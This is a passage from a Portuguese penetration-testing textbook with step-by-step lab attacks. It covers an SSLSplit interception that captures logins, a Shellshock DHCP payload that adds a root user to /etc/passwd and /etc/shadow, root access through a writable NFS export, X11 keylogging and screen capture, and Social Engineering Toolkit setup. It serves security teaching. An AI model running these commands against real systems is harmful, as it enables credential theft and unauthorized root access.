rar\tum\tcertificado\tdigital\tgenérico\te\ttambém\ta\tsua\tchave:\nroot@kali#\n\topenssl\tgenrsa\t-out\tca.key\t4096\nroot@kali#\t\nopenssl\treq\t-new\t-x509\t-days\t1826\t-key\tca.key\t-out\tca.crt\nHabilite\to\tredirecionamento\tda\tporta\t443\tpara\to\tSSLSplit:\nroot@kali#\n\tiptables\t-t\tnat\t-A\tPREROUTING\t-p\ttcp\t--dport\t443\t-j\tREDIRECT\t--to-ports\t8443\nSe\to\tleitor\tquiser\tque\to\tSSLSplit\ttambém\tcapture\to\ttráfego\tde\toutras\tportas\n(como\to\tHTTP),\to\tprocedimento\té\to\tmesmo.\tParticularmente,\teu\tnão\nrecomendo,\tpois,\tcomo\tserá\tvisto\tadiante,\to\tSSLSplit\tgera\tmuito\ttráfego.\nInicie\to\tSSLSplit:\nroot@kali#\n\tsslsplit\t–l\tconnections.log\t–j\t/tmp/sslsplit/\t-S\tlogdir/\t–k\tca.key\t–c\tca.crt\tssl\t0.0.0.0\t8443\ttcp\n0.0.0.0\t8080\nAcesse\tum\tsite\tHTTPS\tcom\ta\tvítima\t10.0.0.3.\tDe\tforma\tsimilar\tao\tataque\tdo\nSSLStrip,\tserá\tsolicitado\tao\tcliente\ta\tinstalação\tdo\tcertificado\tfalso.\tInstalando\to\ncertificado\te\tdigitando\to\tusuário\te\tsenha\tdo\tsite,\to\ttráfego\tfica\tarmazenado\tem\n/tmp/sslsplit/logdir\n.\nReúna\tos\tarquivos\tcom\to\tcomando\t\ncat\n:\nroot@kali#\n\tcd\t/tmp/sslsplit/logdir\nroot@kali#\n\tcat\t*\t>\tarquivo_geral\nAbra\to\tlog\tcom\to\t\nvi\n\tou\toutro\teditor\tde\ttexto\tde\tsua\tpreferência:\nroot@kali#\n\tvi\tarquivo_geral\nO\tusuário\te\tsenhas\testarão\tdentro\tdesse\tarquivo.\tPor\texemplo,\tvamos\tpesquisar\npelo\tnome\tde\tusuário\te\tsenha\tque\tforam\tdigitados\tpara\to\tGmail\t(editado\tpor\nmotivos\tvisuais).\nGALX\n=OkJ6PD6471M&continue=https%3A%2F%2F\nmail.google.com\n%2Fmail%2F&service=mail&rm=false\n&ltmpl=default&scc=1&ss=1&_8=%E2%98%83&bgresponse=%21FxRC17GOtJKGvJtEhHqMi5b3ME0CAAAAoVIAAAAUKg\nD6bhKnpnj9XQ9S3q5sUIwkBxEAzkUcipmI5c1gsgZmbH5g07Ykju44oR_bhEeTFXuqesuXgQaAJ5GWZ-\n_Ris7634sJ_\nzZxJgzfsZBftarXIb00ZTr23mFJyGClmnanMApwRoQOkVRx_XgWNnyRbLwiCh9ZsAK-zZxJgzfsZBftarXIb00ZTr23mFJyGClmnanMApwRoQOkVRx_XgWNnyRbLwiCh9ZsAK-\nwtllHfm17bnQsL_JWoT7iUfXw43\n-p0fe9Kw5h6ZboLm62e-0Sz3A6afInlZnl-\nEDxRZByGS7H2nu1XTzHAOqicYYVzXXeb9mjBZ8wZIaIxxUYv3OM1zVc\nKFfzjQ2STypK-u3etK1Hn4H-Cu2KF6zjoKqF43n27Z8bfsKHhILZuEcMkyBfg&pstMsg=1\n&dnConn=&checkConnection=&checkedDomains=youtube&\nEmail=vpn_layer2@gmail.com\n&Passwd=senha_gmail\n&signIn=Fazer+login&PersistentCookie=yes&rmShown=1HTTP/1.1\t200\nOK^M\nVamos\tpesquisar\tpelo\tnome\tde\tusuário\te\tsenha\tque\tforam\tdigitados\tpara\to\nFacebook\t(editado\tpor\tmotivos\tvisuais).\nlsd\n=AVri7hsY&\nemail=vpn_layer2@facebook.com&pass=email_facebook\n&default_persistent=0&timezone=&lgnrnd=071209_Uhh4&lgnjs=n&locale=pt_BRHTTP/1.1\n200\tOK\nMais\tinformações\tsobre\to\tprojeto\tLayer2-Pivoting-Cliente\tpodem\tser\tobtidas\nem:\n•\thttps://github.com/rsmudge/Layer2-Pivoting-Client\n.\n•\t\nhttp://blog.cobaltstrike.com/2014/10/14/how-vpn-pivoting-works-with-\nsource-code/\n.\n\t\nNota:\n\tem\ttestes\trealizados,\tobservei\tque\tnão\tsão\ttodas\tas\tplacas\tde\trede\tque\taceitam\to\tsoftware\nsimpletun.c\n,\tportanto,\tse\to\tseu\tKali\tLinux\treceber\ta\tconexão,\tmas\tnão\tconseguir\to\tIP\tda\trede\talvo\npor\tmeio\tdo\tcomando\t\ndhclient\n,\trealize\to\tmesmo\tteste\tcom\toutra\tinterface\tde\trede\te/ou\taté\tmesmo\ncom\toutro\tcomputador\tpessoal\t(Pessoalmente,\tnão\tdescobri\to\tmotivo,\tmas\tutilizando-se\tde\toutro\nnotebook\to\tteste\tfoi\trealizado\tcom\tsucesso).\n\t\n9.7\tVulnerabilidade\tshellshock\nA\tvulnerabilidade\tdo\tshellshock\té\tuma\tvulnerabilidade\tenvolvendo\to\t\nbash\n\tde\ncomandos\tdo\tLinux.\tUma\tvulnerabilidade\textremamente\tsimples\tque\tenvolve\nvariáveis\tde\tambiente.\tNo\tmomento\tem\tque\té\tdefinida\tuma\tvariável\tde\nambiente,\ttambém\té\tpossível\ta\texecução\tde\tcomandos\tdo\tshell.\tEssa\nvulnerabilidade\tpermite\ta\texecução\tde\tcódigos\tremotos.\n()\t{\t:;};\nDigite\tno\tterminal\tdo\tDebian:\nenv\tx='()\t{\t:;};\techo\tSistema\tVulnerável'\tbash\t-c\t'echo\tMensagem\tqualquer'\nO\tcenário\tmais\ttípico\tde\texploração\tdessa\tvulnerabilidade\té\tpor\tmeio\tdo\tCGI\tdoApache,\tporém\tvamos\texplorar\tessa\tfalha\tpor\tmeio\tdo\tDHCP.\nNo\tmomento\tem\tque\tum\tLinux\té\tconectado\tà\trede,\tpode\tter\ta\tsua\tsegurança\ncomprometida.\nComo\tum\tcenário\tde\tteste,\tinicie\to\tservidor\tSSH\tno\tDebian:\nroot@debian#\n\tservice\tssh\tstart\nHabilite\to\troteamento\tde\tpacotes\t(IP\tForward):\nroot@kali#\n\techo\t1\t>\t/proc/sys/net/ipv4/ip_forward\nHabilite\ta\tconectividade\tcom\ta\tinternet\tpor\tmeio\tda\tinterface\tcabeada\t\neth0\n:\nroot@kali#\n\tiptables\t-F\nroot@kali#\n\tiptables\t–F\t–t\tnat\nroot@kali#\n\tiptables\t–t\tnat\t–A\tPOSTROUTING\t–o\teth0\t–j\tMASQUERADE\nInstale\to\tdnsmasq:\nroot@kali#\t\napt-get\tinstall\tdnsmasq\nInclua\tno\tfinal\tdo\tarquivo\t\n/etc/dnsmasq.conf\n:\ninterface=\"eth0\"\ndhcp-range=192.168.1.102,192.168.1.103,12h\ndhcp-option-force=114,()\t{\t:;\t};\techo\t\"ghost:x:0:0:root:/root:/bin/bash\"\t>>\t/etc/passwd;\techo\n\"ghost:$6$feBiS9hJ$JAbpSeNhwAqSNhabxexMsxNhbltOf1hMQyPIZ34PD8Cmf4/07YkXSxeBvU3OxUH13JSB4Vcj/D1YB/OmIUjqG/:16330:0:99999:7:::\"\n>>\t/etc/shadow\nSerá\tadicionado\to\tusuário\t“ghost”\tcom\tsenha\t“ghost”\tno\tsistema.\n\t\nNota:\n\to\thash\tgerado\te\tinserido\tno\tarquivo\t\n/etc/dnsmasq.conf\n\té\to\thash\tquando\tum\tusuário\té\tadicionado\nao\tsistema.\tFaça\tum\tteste:\nCrie\to\tusuário\t\nghost\n\tno\tsistema\nroot@kali#\n\tadduser\tghost\nDigite\t“ghost”\tcomo\tsenha\tdesse\tusuário\nEnter\tnew\tUNIX\tpassword:\tghost\nRetype\tnew\tUNIX\tpassword:\tghost\nConfira\tcom\to\tcat\to\tarquivo\t\n/etc/shadow\n\tdo\tseu\tsistema\nroot@kali#\t\ncat\t/etc/shadow\nO\thash\tescrito\tno\tlivro\té\to\tmesmo\tque\to\thash\tgerado\tcom\to\tcomando\t\npasswd\n.\tIsso\tporque\to\nalgoritmo\tmatemático\tpara\tcriar\tesse\thash\té\to\tmesmo.\n\t\nInicie\to\tservidor\tdnsmasq:\nroot@kali#\t\nservice\tdnsmasq\tstartDesabilite\ta\tinterface\t\neth0\n\tdo\tDebian:\nroot@debian#\t\nifdown\teth0\nHabilite\tnovamente\tessa\tinterface:\nroot@debian#\t\nifup\teth0\nNesse\tmomento\té\tcriado\to\tusuário\t\nghost\n\tno\tarquivo\t\n/etc/passwd\n\te\t\n/etc/shadow\n:\nroot@debian#\t\ncat\t/etc/passwd\nroot@debian#\t\ncat\t/etc/shadow\nConecte-se\tvia\tSSH\tao\tservidor\tDebian\tpara\tacesso\troot\tà\tmáquina:\nUsuário:\tghost\nSenha:\tghost\nroot@kali#\n\tssh\t192.168.1.102\t–l\tghost\n9.8\tExplorando\tservidores\tNFS\tmal\tconfigurados\nComo\tvisto\tno\texemplo\tdo\tshellshock,\tservidores\tLinux\ttambém\tsofrem\tde\nvulnerabilidades\tcomo\testouro\tde\tpilha,\tcondição\tde\tcorrida,\tproblemas\tcom\nsymlinks\t(links\tsimbólicos)\tetc.\tHá\tinúmeros\tartigos\tsobre\tvulnerabilidades\tque\nsão\texpostas\tnos\tprincipais\tsites\tcomo\to\tpacketstormsecurity,\texploit-db,\nsecurityfocus\tetc.\tPorém,\tparticularmente,\tacredito\tque\tos\tpiores\terros\tem\nsistemas\tLinux\testejam\trelacionados\tà\tforma\tcomo\to\tdispositivo\té\tconfigurado.\nUma\tmá\tconfiguração\tde\tdeterminado\tdispositivo\te\tjá\té\tmais\tdo\tque\tsuficiente\npara\tum\tatacante\tconseguir\tacesso\troot\tà\tmáquina.\tUm\texemplo\tque\tse\tencaixa\nnesse\tcenário\tsão\tos\tservidores\tNFS.\tO\tNFS\t(Network\tFile\tSystem)\té\tum\nserviço\tque\tpermite\taos\tusuários\tmontarem\to\tsistema\tde\tarquivos\tdo\tservidor\nrodando\tNFS\tna\tsua\tmáquina\tlocal,\tpodendo\tassim\t(pela\tinternet)\tacessar\tos\narquivos\tdo\tservidor.\tPorém\ta\tmaior\tvulnerabilidade\tde\tservidores\tNFS\treside\nno\tfato\tde\tcomo\tsão\tas\tpermissões\tde\tmontagem\tdo\tsistema\tde\tarquivos\tdo\nservidor\te\tquem\tsão\tos\tclientes\tpermitidos\ta\trealizar\tessa\tmontagem.\tO\terro\nmais\tcomum\té\tdeixar\to\tdiretório\traiz\t\n/\n\tdo\tLinux\tcom\tpermissões\tde\tescrita\tpara\nque\tqualquer\tcliente\tmonte\tna\tsua\tprópria\tmáquina\to\tsistema\tde\tarquivos\tdo\nservidor.\tCom\ta\traiz\tmontada,\tos\tvetores\tde\tataque\tvão\tda\tcriatividade\tdo\natacante.\nVamos,\tentão,\tconfigurar\tum\tservidor\tNFS\tvulnerável.\nPrimeiro,\tinstale\to\tservidor\tNFS\tno\tDebian:root@debian#\n\tapt-get\tinstall\tnfs-kernel-server\trpcbind\nAltere\to\tarquivo\t\n/etc/exports\t\npara\to\tseguinte\tconteúdo:\n/\t*(rw,no_root_squash,no_subtree_check)\nPodemos\tobservar\tque\to\tsistema\tque\tserá\tmontado\tremotamente\té\to\traiz\t/\te\tque\nnós\tdamos\ta\tpermissão\tde\tescrita\tpor\tmeio\tde\t\nrw\n,\tpara\tque\tqualquer\tcliente\t(*)\nconsiga\tmontar\tremotamente\to\tnosso\tservidor.\nReinicie\to\tservidor\tcom\tos\tcomandos:\nroot@debian#\n\tservice\trpcbind\tstart\nroot@debian#\t\nservice\tnfs-kernel-server\trestart\nServidores\tNFS\tsão\tassociados\tao\tRPC.\tA\tsigla\tRPC\tsignifica\t“chamada\tao\nprocedimento\tremoto”,\te\tpermite\tque\tos\taplicativos\tcomuniquem-se\tentre\tsi.\nEntão,\tpor\texemplo,\tdeterminados\taplicativos,\tcomo\to\tNFS,\talertam\to\tRPC\tde\nque\testão\tativos\te\tusando\tdeterminada\tporta\tpara\tconexões.\tO\tserviço\tRPC,\tpor\npadrão,\tescuta\tna\tporta\tTCP\t111.\nNo\tKali\tLinux,\tverifique\tpor\tmeio\tdo\t\nrpcinfo\n\tse\to\tNFS\testá\tativo\tno\tsistema\nalvo,\tfazendo\tchamadas\tao\tRPC.\nroot@kali#\n\trpcinfo\t-p\t192.168.1.102\nO\tserviço\tNFS\testará\tativo.\nVerifique\tquais\tsão\tas\tpartições\tque\tpodem\tser\tmontadas\te\tpor\tquais\tclientes:\nroot@kali#\t\nshowmount\t-e\t192.168.1.102\nA\tresposta\tserá:\nExport\tlist\tfor\t192.168.1.102:\n/\t*\nIndicando\tque\ta\tpasta\t/\testá\tacessível\tpara\ttodos\t(*).\nMonte\ta\tpasta\tcom\to\tcomando\t\nmount\n:\nroot@kali#\n\tmount\t-o\tnolock,vers=3\t192.168.1.102:/\t/mnt\nO\tdiretório\traiz\tde\t192.168.1.102\tfoi\tmontado\tem\t\n/mnt\n.\nVamos\tentão\tfazer\tde\tforma\tanáloga\tao\tlaboratório\tdo\tShellshock,\tinserindo\ndentro\tde\t\n/mnt/etc/passwd\n\to\tusuário\tghost\t(utilize\to\tseu\teditor\tde\ttexto\tfavorito,\ncomo\to\tvi,\tnano,\tpico):\nghost:x:0:0:root:/root:/bin/bashVamos\ttambém,\tinserir\ta\tsenha\tdo\tusuário\tghost\tno\tarquivo\t\n/mnt/etc/shadow\n(utilize\to\tseu\teditor\tde\ttexto\tfavorito,\tcomo\to\tvi,\tnano,\tpico):\nghost:$6$feBiS9hJ$JAbpSeNhwAqSNhabxexMsxNhbltOf1hMQyPIZ34PD8Cmf4/07YkXSxeBvU3OxUH13JSB4Vcj/D1YB/OmIUjqG/:16330:0:99999:7:::\nFaça\to\tlogin\tvia\tSSH\tcom\to\tusuário\t\nghost\n\te\tsenha\t\nghost\n.\tVocê\té\to\troot\tdo\nsistema.\n9.9\tExplorando\tX\tWindow\tSystem\nAssim\tcomo\to\tNFS,\ta\tmaior\tvulnerabilidade\tde\tsistemas\tX\t(X\tWindow\tSystem)\né\ta\tforma\tcomo\tsão\tconfigurados.\nO\tservidor\tde\tjanela\tX\t(X\tWindow\tSystem)\tpermite\tque\tambientes\tLinux\npossuam\tinterface\tgráfica.\tSe\to\tleitor\testiver\tutilizando\ta\tinterface\tgráfica\tno\nLinux,\testá\tusando\to\tservidor\tde\tjanela\tX.\tEsse\tservidor\tfunciona\tna\tarquitetura\ncliente-servidor.\tO\tservidor\tX\tfica\tescutando\tem\tdeterminada\tporta\n(normalmente\ta\tporta\t6000,\tmas\tpode\tvariar\tde\t6000\taté\t6005).\tO\tcliente\nconecta-se\tao\tservidor\tpor\tmeio\tdo\tprotocolo\tX\te\ttoda\ta\tinterface\tgráfica\té\ndisponibilizada\tpara\to\tcliente.\nO\tmais\tcomum\té\tadotar\to\tX\tWindow\tSystem\tapenas\tpara\tuso\tlocal,\tou\tseja,\napenas\ta\tmáquina\tlocal\tacessa\to\tservidor\tX.\tPorém\to\tservidor\tX\tpode\tser\nconfigurado\tpara\tpermitir\tconexões\tremotas\tvindas\tde\toutras\tmáquinas\tda\trede,\nou,\tna\tpior\tdas\thipóteses,\tpara\tpermitir\ta\tconexão\tde\tqualquer\tmáquina\tda\trede.\nSe\tum\tservidor\tX\tpermite\tconexões\toriundas\tde\tqualquer\tlugar,\tum\tatacante\npode\tse\taproveitar\tdesse\ttipo\tde\tconfiguração\tpara\texplorar\to\tservidor\tX.\nPrimeiro,\tdevemos\tter\tuma\tmáquina\tLinux\tcom\tuma\tinterface\tgráfica\thabilitada.\nNa\tinstalação\tpadrão\tdo\tDebian,\ta\tinterface\tgráfica\t(Xorg)\tjá\té\tinstalada.\tSe\to\nleitor\tnão\tpossui\tuma\tinterface\tgráfica,\tpoderá\tinstalar\to\tXorg.\nO\tXorg\tnão\tpossibilita\tque\tmáquinas\tremotas\tconectem-se\tao\tservidor\tX.\tPorém\nvamos\tpermitir\tque\tqualquer\tcliente\t(máquina)\tda\trede\tconecte-se\tremotamente\nao\tnosso\tservidor.\tPara\tisso,\tinicie\ta\tinterface\tem\tmodo\ttexto\tdo\tDebian\nacessando\to\tterminal\ttty1\tpressionando\to\t\nCtrl\n\tda\tdireita\tcom\ta\ttecla\t\nF1\n.\nAcesse\to\tterminal\tcom\tusuário\te\tsenhas\tdo\troot.\nInicie\tuma\tnova\tinstância\tdo\tservidor\tX\tpor\tmeio\tdo\tcomando\t\nstartx\n.\tComo\ta\nsessão\t0\té\tiniciada\tpor\tpadrão\tno\tDebian\t(e\tnão\tpermite\tacesso\tremoto),\tvamos\ncriar\ta\tsessão\t1.root@debian#\n\tstartx\t--\t:1\nAbra\tum\tterminal\te\tdigite\t\nxhost\n:\nroot@debian#\n\txhost\nAccess\tcontrol\tenable\n,\tonly\tauthorized\tclients\tcan\tconnect\nO\tcontrole\tde\tacesso\testá\tindicando\tque\tsomente\tusuários\tautorizados\tpodem\tse\nconectar\ta\tessa\tsessão\tX.\tVamos\tdesabilitar\tessa\tsegurança,\tpermitindo\tque\nqualquer\tcomputador\tconecte-se\tao\tservidor\tX.\nroot@debian#\n\txhost\t+\nAccess\tcontrol\tdisable\n,\tclients\tcan\tconnect\tfrom\tany\thost\nPrimeiro,\tdevemos\tdeterminar\tse\tum\tservidor\testá\tescutando\tentre\tas\tporta\t6000\naté\t6005.\tPodemos\tutilizar\to\tNmap.\nroot@kali#\n\tnmap\t-sV\t192.168.1.102\nPORT\t\t\t\t\t\tSTATE\t\t\t\tSERVICE\t\t\tVERSION\n6001\n/tcp\t\topen\t\t\t\t\tX11\t\t\t\t\t\t\t\nX.Org\n\t(open)\nOutro\tsoftware\tque\trealiza\ta\tvarredura\tem\tservidores\tX\té\to\tMetasploit\tpor\tmeio\ndo\tmódulo\t\nauxiliary/scanner/x11/open_x11\n.\nmsf\n\t>\tuse\tauxiliary/scanner/x11/open_x11\nmsf\n\tauxiliary(open_x11)\t>\tset\tRHOSTS\t192.168.1.100-192.168.1.102\nRHOSTS\t=>\t192.168.1.100-192.168.1.102\nmsf\n\tauxiliary(open_x11)\t>\tset\tRPORT\t6001\nRPORT\t=>\t6001\nmsf\n\tauxiliary(open_x11)\t>\texploit\n[*]\tScanned\t1\tof\t3\thosts\t(33%\tcomplete)\n[*]\tScanned\t2\tof\t3\thosts\t(66%\tcomplete)\n[*]\t\n192.168.1.102\tOpen\tX\tServer\n\t(The\tX.Org\tFoundation)\n[*]\tScanned\t3\tof\t3\thosts\t(100%\tcomplete)\n[*]\tAuxiliary\tmodule\texecution\tcompleted\nSabendo\tque\to\tservidor\tencontra-se\tativo\te\tesperando\tpor\tconexões,\tuma\tdas\nformas\tpossíveis\tde\texploração\té\tpor\tmeio\tdo\tkeylogger\tremoto.\tInstale\ta\tsuíte\nx11-apps\t\nno\tKali\tLinux\tpara\tinstalação\tdo\t\nxspy\n.\nroot@kali#\n\tapt-get\tinstall\tx11-apps\nExporte\to\tdisplay\tlocal\tcomo\tsendo\to\tIP\tda\tmáquina\tremota\tjuntamente\tcom\to\nseu\tnúmero\tda\tsessão\tX.\nroot@kali#\t\nexport\tDISPLAY=192.168.1.102:1\nroot@kali#\t\nxspy\nopened\t192.168.1.102:1\tfor\tsnoopngopened\t192.168.1.102:1\tfor\tsnoopng\nTudo\to\tque\tfor\tdigitado\tno\tDebian\tserá\tarmazenado\tpelo\t\nxspy\n\t(incluindo\tsessões\nde\tterminal).\nTambém\té\tpossível\tver\tquais\tsão\tos\tprogramas\tem\texecução\t\npelo\t\nxwininfo\n.\nroot@kali#\t\nxwininfo\t-root\t-all\t-display\t192.168.1.102:1\nPelo\t\nxkill\n\té\tpossível\tfinalizar\tum\tdeterminado\tprograma\tgráfico.\tPor\texemplo,\nvamos\tfinalizar\ta\tinstância\tda\tcalculadora\t(gcalctool).\nroot@kali#\t\nxwininfo\t-root\t-all\t-display\t192.168.1.102:1\t|\tgrep\tgcalctool\n0x2800001\n\t\"gcalctool\":\t(\"gcalctool\"\t\"Gcalctool\")\t\t10x10+10+10\t\t+10+10\n\t\t\t0x2800003\t\"Calculadora\":\t(\"gcalctool\"\t\"Gcalctool\")\t\t312x255+1+34\t\t+40+68\nO\tnúmero\tde\tidentificação\tda\tcalculadora\té\t0x2800001.\nFinalize-o\tpor\tmeio\tdo\txkill:\nroot@kali#\t\nxkill\t-display\t192.168.1.102:1\t-id\t0x2800001\nÉ\tpossível\trealizar\tum\tscreenlogger\tno\tsistema\talvo.\tPara\tisso,\tvamos\tcapturar\ta\ntela\tpor\tmeio\tdo\t\nxwd\n,\trealizando\tum\tpipe\tpara\tarmazenarmos\tos\tdados\tem\tum\narquivo\tchamado\tde\t\ntela_capturada.xwd\n.\nroot@kali#\t\nxwd\t-root\t-display\t192.168.1.102:1\t>\t/root/Desktop/tela_capturada.xwd\n1\n\tArquivos\tde\tlog\tsão\tarquivos\tque\tregistram\tas\tatividades\tde\tdeterminado\tusuário.\tSe\tum\tatacante\tobter\num\tacesso\tnão\tautorizado\ta\tum\tsistema,\tcom\tcerteza\tele\tnão\tvai\tquerer\tque\tsuas\tatividades\tmaliciosas\nfiquem\tregistradas.\tEle\tvai\tbuscar\te\tapagar\tesse\ttipo\tdo\tregistro,\tcomo\tse\ta\tinvasão\tnunca\ttivesse\nocorrido.CAPÍTULO\n\t10\nEngenharia\tsocial\nEngenharia\tsocial\tconsiste\tno\tato\tde\tobter\tinformações\tdas\tpessoas.\tO\tconceito\nenvolvido\tem\tengenharia\tsocial\tnão\té\tmoderno\te\tjá\texiste\thá\ttempos\tremotos.\nToda\te\tqualquer\ttécnica\tde\tmanipulação,\tpersuasão\te\tlábia\tenquadra-se\tcomo\nengenharia\tsocial.\tMas\to\ttermo\t“engenharia\tsocial”\tsurgiu\tcom\to\thacker/cracker\nKevin\tMitinick,\tque,\tno\tauge\tde\tsuas\tinvasões\ta\tdispositivos\te\tsistemas\ngovernamentais,\tutilizava-se\tde\tmétodos\tnão\tcomputacionais\tpara\tobter\ninformações\tdas\tpessoas.\tApelidou\tas\tsuas\ttécnicas\tcomo\tSocial\tEngineering.\nPor\tmeio\tda\tengenharia\tsocial,\to\talvo\tpode\tfornecer\tinformações\tpreciosas,\ncomo\taté\tmesmo\ta\tsua\tsenha\tde\tacesso\ta\tdeterminado\tativo/servidor\tou\tpermitir\na\tinstalação\tde\tprogramas\tmaliciosos\t(backdoors).\tNormalmente,\tataques\tde\nengenharia\tsocial\tsão\tempregados\tcom\to\tintuito\tde\tse\tobter\tinformações\nconfidenciais\tou\tpara\tter\tacesso\tà\táreas\trestritas.\tPor\texemplo,\tum\tphishing\n(email\tfalso)\té\tuma\ttécnica\tde\tengenharia\tsocial,\tum\tUSB\tinfectado\tcom\nmalware\t(BadUSB)\té\toutra\ttática.\nA\tengenharia\tsocial\tnão\tse\tlimita\ta\tmeios\tcomputacionais.\tQualquer\tpessoa\tque\nconsiga\tconvencer\toutras\ta\trealizar\tdeterminada\tatitude\tpara\talcançar\to\tseu\nobjetivo\té\tcategorizada\tcomo\tengenheira\tsocial.\tExemplos\tde\tengenheiros\nsociais:\thackers,\tcrackers,\tauditores\tde\trede,\tpentesters,\tscammers\t(golpistas\nvirtuais),\tcarders\t(ladrões\tvirtuais\tde\tcrédito\te\tcontas\tbancárias),\tvigaristas,\nvendedores,\tespiões\tetc.\nLembrando\tque\ttoda\ta\tatividade\tda\tengenharia\tsocial\tbaseia-se\tno\tfator\nconfiança.\tCaso\tvocê\tnão\tconsiga\tconstruir\to\tvínculo\tde\tconfiança\tcom\to\tseu\nalvo,\té\tmuito\tprovável\tque\tfalhe.\nNeste\tcapítulo\tserão\tdiscutidos\tquais\tsão\tos\tprincípios\te\tpráticas\tadotadas\tpor\num\tengenheiro\tsocial.\tQuais\tsão\tas\ttécnicas\tque\tauxiliam\tum\tusuário\ta\tdivulgar\ndeterminada\tinformação\tou\trealizar\tum\tato,\talém\tde\tfalarmos\ttambém\tsobre\ta\nutilização\tda\tferramenta\tSET\tpara\tauxílio\tda\tengenharia\tsocial\tbaseada\tem\ncomputadores,\te\tsobre\to\tpotente\tataque\tBadUSB,\tque\tpermite\tinfectarmos\to\nfirmware\tde\tum\tpendrive\tcom\tcódigo\tmalicioso.10.1\tProcesso\tde\tataque\nA\tengenharia\tsocial\tpode\tser\tdividida\tnas\tseguintes\tetapas:\tcoleta\tde\ninformações,\tconfiança,\tvetor\tde\tataque\te\texecução\n1\n.\n•\t\nColeta\tde\tinformações\n\t–\tColetam-se\tas\tinformações\tiniciais\trelativas\tao\nalvo.\n•\t\nConfiança\n\t–\tInformações\tmais\tespecíficas\tcomeçam\ta\tser\tcoletadas:\tusuários\nmais\tsuscetíveis\tà\texecução\tde\tprogramas\tmaliciosos,\tdeterminação\tde\tqual\té\na\tversão\tdo\tnavegador\tque\ttal\tempresa\tutiliza\t(caso\to\tnavegador\tseja\to\nInternet\tExplorer\tversão\tinferior\ta\t11,\tpode-se\tutilizar\to\texploit\t“Internet\nExplorer\t<\t11\t–\tOLE\tAutomation\tArray\tRemote\tCode\tExecution”).\tNessa\nfase,\to\tatacante\tdeve\testabelecer\tuma\trelação\tde\tconfiança\tcom\to\tseu\talvo.\n•\t\nVetor\tde\tataque\n\t–\tPlanejamento\tdo\ttipo\tde\tataque\tque\tserá\tefetuado.\tPode\nser\ttanto\tbaseado\tem\tpessoas\tcomo\tbaseado\tem\tcomputadores.\tAtaques\nbaseados\tem\tcomputadores\tcaracterizam-se\tpor\tusar\tmeios\ttecnológicos,\ncomo\to\tuso\tde\tphishing,\tsites\tmaliciosos,\tbackdoors\tetc.\tAtaques\tbaseados\nem\tpessoas\tcaracterizam-se\tpelo\tcontato\tdireto,\tcomo\ttelefonemas\tou,\taté\nmesmo,\ta\tida\tfísica\tdo\tatacante\tà\tempresa\tpara\tefetuar\to\tataque.\n•\t\nExecução\n\t–\tExecução\tdo\tataque.\tNesse\tponto,\to\tatacante\tjá\tdeve\tter\nestabelecido\ta\trelação\tde\tconfiança\tcom\ta\tsua\tvítima\tpara\tnão\tdespertar\nsuspeitas.\tDo\tcontrário,\to\tataque\tvai\t“cair\tpor\tterra”.\nAtaques\tde\tengenharia\tsocial\tsão\tclassificados\tcomo\tcrime\tde\tacordo\tcom\ta\nlegislação\tbrasileira.\tAssim,\tse\to\tleitor\tpensar\tem\tse\taventurar\tnesse\tmundo,\npense\tque\tserá\tprocessado\te\tprovavelmente\tpreso\tpelas\tleis\tCarolina\tDieckman,\nfalsidade\tideológica,\testelionato\te\tdemais\tpenalizações\tjudiciais\tdependendo\tdo\nque\tfoi\trealizado.\n10.2\tTipos\tde\tengenharia\tsocial\nToda\te\tqualquer\ttécnica\tde\tpersuasão\te\tinfluência\tpode\tser\tconsiderada\nengenharia\tsocial,\tindependentemente\tde\tser\tligada\tà\tárea\tde\tinformática\tou\tnão.\nPor\tconta\tdisso,\ta\tengenharia\tsocial\tpode\tser\tclassificada\tem\tdois\ttipos:\n•\t\nBaseado\tem\tpessoas\n\t–\tNesse\ttipo\tde\tengenharia\tsocial,\tas\ttécnicas\tutilizadas\nnão\tnecessitam\tdo\tauxílio\tde\tprogramas\tcomputacionais.\tPor\texemplo,disfarces,\tvendedores,\tvigaristas,\tvendedores\tde\ttelemarketing,\tcategorizam-\nse\tnesse\tformato\tde\tengenharia\tsocial.\n•\t\nBaseado\tem\tcomputadores\n\t–\tNesse\ttipo\tde\tengenharia\tsocial,\tas\ttécnicas\nutilizadas\tnecessitam\tdo\tauxílio\tde\tprogramas\tcomputacionais.\tPor\texemplo,\no\tphishing\te\tbackdoors\tcategorizam-se\tnesse\tformato\tde\tengenharia\tsocial.\n10.3\tSET\t(Social\tEngineering\tToolkit)\nO\tSET\té\tuma\tferramenta\tde\tfácil\tuso\tpara\tataques\tde\tengenharia\tsocial\tcom\tbase\ntecnológica.\tApresenta\topções\tcomo\tgeração\tde\tcavalos\tde\tTroia,\tphishing,\ncriação\tde\tmídia\tinfectada\tetc.\n\t\nNota\n:\tVersões\tinferiores\ta\t6.5.9\tsão\tmuito\tinstáveis,\tcom\talguns\tbugs\te\tnão\tsendo\tcorretamente\nintegrado\tao\tMetasploit.\tO\taconselhado\té\tque\tse\trealize\tmanualmente\to\tdownload\tdo\tSET.\tAo\tutilizar\no\tSET\tcom\to\tMetasploit,\tutilize\ta\tversão\t6.5.9:\nroot@kali#\tgit\tclone\thttps://github.com/trustedsec/social-engineer-toolkit\tset\nroot@kali#\tcd\tset\nroot@kali#\t./setoolkit\n\t\nNa\tprimeira\ttela\tdo\tSET,\tserão\texibidas\tas\topções\tde\tataques\tde\tengenharia\nsocial,\tcomo\tSocial-Engineering\tAttacks,\tFast-Track\tPenetration\tTesting,\tThird\nParty\tModules\tetc.\tVamos\ttrabalhar\tcom\ta\topção\t\n1)\tSocial-Engineering\tAttacks.\nSelect\tfrom\tthe\tmenu:\n1)\tSocial-Engineering\tAttacks\n2)\tFast-Track\tPenetration\tTesting\n3)\tThird\tParty\tModules\n4)\tUpdate\tthe\tSocial-Engineer\tToolkit\n5)\tUpdate\tSET\tconfiguration\n6)\tHelp,\tCredits,\tand\tAbout\n99)\tExit\tthe\tSocial-Engineer\tToolkit\nset\n>\t1\nHá\tdiversas\topções\tde\tataques\tvoltados\tà\tengenharia\tsocial,\tcomo\tSpear-\nPhishing\tAttack\tVectors,\tWebsite\tAttack\tVectors,\tInfectious\tMedia\tGenerator\netc.\tParticularmente,\tnão\tgosto\tda\topção\t\n1)Spear-Phishing\tAttack\tVectors\n,\tpois\nnessa\topção\tserá\tenviado\tum\temail\tem\tmassa\tcom\texploits\tpreparados,\tporém\ta\nmaioria\tdos\texploits\té\tantiga\te\tdefasada.\tPor\tisso,\tvamos\tescolher\ta\topção\t\n2)\nWebsite\tAttack\tVectors.Select\tfrom\tthe\tmenu:\n1)\tSpear-Phishing\tAttack\tVectors\n2)\tWebsite\tA